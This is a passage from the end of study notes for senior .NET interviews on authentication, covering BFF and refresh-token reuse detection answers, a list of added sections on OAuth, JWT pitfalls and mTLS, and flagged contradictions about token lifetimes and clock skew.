Backend-for-Frontend: the SPA holds only a plain session cookie with its own backend, which performs the OAuth dance server-side and never exposes an OAuth/JWT token to the browser at all. It removes the "where do I safely store a token in JS" problem entirely, at the cost of an extra backend component. See [3.9](#39-new-content-securing-spa-to-api-auth-bff-pattern-vs-token-in-browser).

**Q14. [new content] How would you design refresh token reuse detection?**
Mark each refresh token "consumed" (not deleted) after use rather than just replacing it. If a consumed token is presented again, treat it as a signal of theft and revoke the entire token family, forcing full re-authentication — even though this also logs out the legitimate user, it's the safer failure mode. See [3.8](#38-new-content-refresh-token-rotation--reuse-detection).

---

## Summary of Additions

New `[new content]` sections added because they are commonly probed at a senior .NET interview level and were missing or only mentioned as unexplained one-liners in the original notes:

- **2.7 The 7 ASP.NET Core Authorization Styles** — the original notes only listed 7 items with no explanation; expanded each with definitions and examples, including resource-based authorization, which is the mechanism for data-dependent access rules.
- **3.2 OAuth2 Grant Types: Which Are Deprecated/Unsafe** — clarifies the full grant-type landscape and explicitly flags Implicit and ROPC as deprecated/removed in OAuth 2.1, a frequent interview trap.
- **3.5 SAML vs OIDC for SSO/Federation** — not covered at all; essential for enterprise/lead roles that touch legacy IdP integrations alongside modern OIDC.
- **3.8 Refresh Token Rotation & Reuse Detection** — the notes named rotation as a pitfall but never explained reuse detection, the mechanism that actually turns rotation into a real security control.
- **3.9 Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser** — names and contrasts the current OAuth BCP-recommended architecture against the cookie/header dual-mode design the notes describe in depth.
- **3.10 ASP.NET Core Identity Customization** — entirely absent; critical since most real .NET systems build on Identity rather than hand-rolling user management.
- **3.11 Multi-Tenant Authentication & Authorization** — entirely absent; a near-guaranteed SaaS/senior topic (tenant claim design, per-tenant issuers, cross-tenant leakage prevention).
- **4.2 Opaque Tokens vs JWT for Revocation — the Real Trade-off** — reframes an existing bullet as the fundamental latency-vs-revocability architectural decision it actually is.
- **4.3 JWT Validation Pitfalls: Algorithm Confusion & alg:none** — the notes reduced this to one sentence; expanded with the actual attack mechanics and concrete mitigation, since "explain this attack" is a common follow-up.
- **4.4 (session fixation addition)** — session fixation wasn't mentioned at all; added alongside the existing CSRF/XSS explanations since all three are the standard trio of auth-adjacent web attacks.
- **4.5 mTLS for Service-to-Service Auth** — the notes had a single unexplained bullet ("Mutual TLS for service identity"); expanded into a full explanation with .NET-specific notes.
- **4.6 API Keys vs OAuth Client Credentials for Machine-to-Machine** — entirely absent; a very common real-world design question for partner/service integrations.
- **Q11–Q14 in Sample Interview Q&A** — added to directly answer the new gap topics in interview-answer format.

**Contradictions flagged during consolidation:**
- Access token lifetime guidance varied across source sections (5–15 min in one place, 5–30 min, 10–30 min, and 15–60 min in others). Kept the more conservative senior-level guidance (5–30 minutes, with 5–15 as the tighter/preferred end) and noted the range rather than picking one number as absolute, since real systems vary by risk tolerance.
- One code sample set `ClockSkew = TimeSpan.Zero` while the prose elsewhere recommended allowing 1–2 minutes of skew. Flagged in the implementation reference and changed the illustrative code to `TimeSpan.FromMinutes(2)` to match the (more correct) prose guidance, since `TimeSpan.Zero` contradicts the notes' own stated best practice and causes exactly the "random clock-skew auth failures" pitfall the notes separately warn about.
- No other substantive factual contradictions were found — the notes are largely consistent repeats/rephrasings of the same core JWT/OAuth concepts across multiple source passes.
